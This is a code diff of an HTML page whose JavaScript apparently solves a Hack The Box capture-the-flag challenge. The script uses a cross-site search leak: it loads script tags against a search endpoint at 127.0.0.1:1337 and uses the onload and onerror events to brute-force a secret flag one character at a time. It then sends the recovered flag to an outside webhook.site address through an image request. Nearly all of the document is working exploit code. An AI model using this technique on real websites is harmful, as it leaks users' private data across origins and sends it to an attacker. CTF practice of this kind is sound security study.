@@ -1,33 +1,60 @@
 <html>
-<head>
-</head>
+<head></head>
 <body>
 <script>
-flag_charset = "}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$()*,-[]_}";
-var charIndex = 0
+const flag_charset = "}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$()*,-[]_}";
+let flag = "HTB{";
+let charIndex = 0;
+let stopped = false;
+const MAX_TRIES = flag_charset.length;
+
 const bruteforce = () => {
-var script = document.createElement("script");
-script.src = `//127.0.0.1:1337/api/entries/search?q=${flag}${flag_charset.charAt(charIndex)}`;
-document.appendChild(script)
-script.onload = () => {
-flag += flag_charset.charAt(charIndex);
-charIndex = 0;
-script.parentNode.removeChild(script);
-if (flag.slice(-1) != "}") {
+  if (stopped) return;
+  if (charIndex >= MAX_TRIES) {
+    console.warn("Đã thử hết charset cho vị trí này — dừng.");
+    stopped = true;
+    return;
+  }
+
+  const candidate = flag_charset.charAt(charIndex);
+  const query = encodeURIComponent(flag + candidate);
+  const script = document.createElement("script");
+
+  // timeout fallback (nếu onload/onerror không gọi)
+  const timer = setTimeout(() => {
+    if (script.parentNode) script.parentNode.removeChild(script);
+    charIndex += 1;
+    setTimeout(bruteforce, 0);
+  }, 5000);
+
+  // handlers trước khi set src/append để tránh race
+  script.onload = () => {
+    clearTimeout(timer);
+    if (script.parentNode) script.parentNode.removeChild(script);
+    flag += candidate;
+    charIndex = 0;
+    if (flag.slice(-1) !== "}") {
+      setTimeout(bruteforce, 0);
+    } else {
+      const img = new Image();
+      img.src = 'https://webhook.site/738551fa-b7a0-4116-a708-4b4ef3977471/?flag=' + encodeURIComponent(flag);
+      stopped = true;
+    }
+  };
+
+  script.onerror = () => {
+    clearTimeout(timer);
+    if (script.parentNode) script.parentNode.removeChild(script);
+    charIndex += 1;
+    setTimeout(bruteforce, 0);
+  };
+
+  // set src sau khi có handlers, append để trigger
+  script.src = `//127.0.0.1:1337/api/entries/search?q=${query}`;
+  document.body.appendChild(script);
+};
+
 bruteforce();
-}
-else {
-img = new Image();
-img.src='https://webhook.site/738551fa-b7a0-4116-a708-4b4ef3977471/?flag='+ flag;
-}
-}
-script.onerror = () => {
-script.parentNode.removeChild(script);
-charIndex +=1;
-bruteforce();
-}
-}
-bruteforce()
 </script>
 </body>
 </html>
